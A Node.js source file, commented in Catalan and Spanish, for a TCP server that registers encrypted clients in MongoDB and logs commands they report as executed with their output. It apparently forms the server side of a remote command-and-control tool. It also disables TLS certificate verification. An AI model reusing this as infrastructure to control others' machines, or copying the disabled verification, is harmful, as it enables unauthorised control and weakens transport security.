const net = require("net");
const fs = require ("fs");
// Importem les funcions getDB, getColl(collectionName), getDocuments(collectionName, filter), connect((err) => {...}) (connecta la base de dades), getPrimeryKey(_id) (retorna el ObjectID de _id)
// Per recollir els documents del obecte Promise retornat per getDocuments, cal passarli la funcio .then( (docs) => {...}));
const db = require('../database/config.js');
// Llistat amb els noms de les colleccions
const collections = ['client', 'comanda', 'user'];
const ciph = require('./crypto/crypto');
const resp = require('./callback-manager')
const split = require ("split");
const fetch = require('node-fetch');
const http = require ("http");
const https = require('https');
const ObjectID = require('mongodb').ObjectID;
const httpsAgent = new https.Agent({
    rejectUnauthorized: false,
    });
function startSockets() {
	const server = net.createServer();
	const port = 1234;
	const host = "0.0.0.0";
	const tout = 3000; //ms para timeout
	const outputurl = "https://127.0.0.1:5000/outputback";
	const statusurl = "https://127.0.0.1:5000/status"
	let sockets = [];
	let websocket = [];
	//keys[0]=publickey keys[1]=privateKey
	const keys = ciph.genkeypair()
	server.listen(port, host, () => {
		console.log(`TCP server listening on ${host}:${port}`);
		db.connect( async (err) =>{
			var cliColl = db.getColl(collections[0])
			var update = {$set:{"status.alive":false}}
			await db.updateColl(cliColl,{},update).then((doc) =>{
				var update = doc
			})
		});
	});
	server.on("connection", async (socket) => {
		var clientAddress = `${socket.remoteAddress}:${socket.remotePort}`;
		console.log(`new client connected: ${clientAddress}`);
		socket.on("data", async (data) => {
	    	//si getdata == a GET
	    	var getdata = String(data).split(" ", 2);
			if( data == 'get public key'){
				socket.write(keys[0])
			}
			else{
				if (getdata[0] === "GET") {
					try {
						websocket.push(socket); 		
						resp.httpRes(socket, sockets, getdata) //funcion callback-manager httpRes
					} catch (error) {
						console.log(error)
					}
				} else{
					if (!socket.hasOwnProperty("sym")){
						let decrypted = await ciph.decrypt(data, keys[1])
						if (decrypted.substr(decrypted.length - 1) == "="){
							socket["sym"] = decrypted
						}
					} else{
						const symData = await ciph.symDecrpyt(socket["sym"], await data.toString(), [])
						const pData = await JSON.parse(symData[0])
						if (pData.head.id === 0) { //identifica cliente con  id 0
								db.connect( async (err) =>{
									var jstring= {ip: socket.remoteAddress, status:{alive: true, lastconnection: new Date()}} 
									console.log(jstring)
									var cliColl = db.getColl(collections[0])
									console.log("insertando nuevo cli")
									await db.insertDocument(cliColl, jstring).then((doc) => {
										//print client ID
										socket["id"] = JSON.stringify(doc.insertedId);
									});
									sockets.push(socket);
									socket.write(`{ "id" : ${socket["id"]}}`)
									console.log(sockets.length);
								});
								console.log("id 0")
						}else { //cuando el cliente ya tiene idpointer
							socket["id"] = JSON.stringify(pData.head.id)

							if (pData.body.message === "Command executed"){
								//console.log(pData)
								var outdata = {"endp":pData.head.id,"cmd":pData.body.command,"output":pData.body.output}
								db.connect( async (err) =>{ //input a la BBDD del output del comando
									var cjstring = {data: new Date(), cmd: pData.body.command, output: pData.body.output, client:pData.head.id}
									var cmdColl = await db.getColl(collections[1])
									await db.insertDocument(cmdColl, cjstring)
									console.log("input del output de la cmd")
								})
								fetch(outputurl, {
								method: 'POST', // or 'PUT'
								headers:{
									'Content-Type': 'application/json',
									'Accept': 'application/json'
								},
								body: JSON.stringify(outdata), // data can be `string` or {object}!
								agent: httpsAgent,			//agente creado con js para evitar problemas con certificado autofirmado
								}).catch(error => console.error('Error:', error))
								socket.destroy()
							}
							if (sockets.includes(socket)===false){
								sockets.push(socket);
								db.connect( async (err) =>{
									var cliColl = await db.getColl(collections[0])
									const ObjectId = new ObjectID(socket["id"].replace(/['"]+/g, ''));
									console.log("La id: ", ObjectId)
									await db.updateDocument(cliColl, {_id:ObjectId}, {$set:{status:{alive:true, lastconnection: new Date()}}}).then((doc) =>{
										var update = doc
									})
								})
								var alive = {alive:true}
								fetch(statusurl, {
									method: 'POST', // or 'PUT'
									headers:{
									'Content-Type': 'application/json',
									'Accept': 'application/json'
									},
									body: JSON.stringify(alive), // data can be `string` or {object}!
									agent: httpsAgent,			//agente creado con js para evitar problemas con certificado autofirmado
								}).catch(error => console.error('Error in start client:', error))
							}
						}
					}
				};
			};
	    });
	    //al cerrarse un socket
		socket.on('close', (data) => {
			console.log("Closed socket client")
			var socl = sockets.includes(socket); //busca en el array si es troba el socket
			if (socl === true) {
				var filtered = sockets.filter(function(value, index, arr){ //extreu el socket de l'array
					return value !== socket;
				});
				sockets = filtered
				var oID = JSON.parse(socket["id"].trim())
				//modifica el documento del cliente para que su estado sea false
				db.connect( async (err) =>{
					var cliColl = await db.getColl(collections[0])
					var ObjectId = new ObjectID(socket["id"].replace(/['"]+/g, ''));
					console.log("Client down: ", ObjectId)
					await db.updateDocument(cliColl, {_id:ObjectId}, {$set:{status:{alive:false, lastconnection: new Date()}}}).then((doc) =>{
						var update = doc
					})
				})
				//envia al backend el estado del cliente al desconectarse
				var alive = {alive:true}
				fetch(statusurl, {
					method: 'POST', // or 'PUT'
					headers:{
					  'Content-Type': 'application/json',
					  'Accept': 'application/json'
					},
					body: JSON.stringify(alive), // data can be `string` or {object}!
					agent: httpsAgent,			//agente creado con js para evitar problemas con certificado autofirmado
				}).catch(error => console.error('Error in disconnect client:', error))

				console.log(`connection closed: ${socket.remoteAddress}:${socket.remotePort}`);
			} else if (socket === websocket){
				console.log('websocket closed')
				var filtered = websocket.filter(function(value, index, arr){ //extreu el socket de l'array
					return value !== socket;
				});
				websocket = filtered
			}	
	    }); 
		// Gestor d'errors 
		socket.on("error", (err) => { 
			console.log(`Error occurred in ${clientAddress}: ${err.message}`); 
		}); 
	});
};
exports.startSockets = startSockets;